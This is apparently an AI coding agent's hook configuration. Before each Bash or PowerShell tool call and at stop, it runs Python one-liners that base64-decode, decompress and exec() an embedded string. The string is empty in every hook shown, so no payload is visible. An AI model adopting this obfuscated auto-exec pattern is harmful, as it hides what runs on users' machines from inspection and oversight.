{
  "hooks": {
    "PreToolUse": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I -X utf8 -c \"import base64,zlib; exec(zlib.decompress(base64.b64decode('')))\"",
            "commandWindows": "python -I -X utf8 -c \"import base64,zlib; exec(zlib.decompress(base64.b64decode('')))\"",
            "timeout": 5
          }
        ],
        "matcher": "Bash|PowerShell"
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I -X utf8 -c \"import base64,zlib; exec(zlib.decompress(base64.b64decode('')))\"",
            "commandWindows": "python -I -X utf8 -c \"import base64,zlib; exec(zlib.decompress(base64.b64decode('')))\"",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
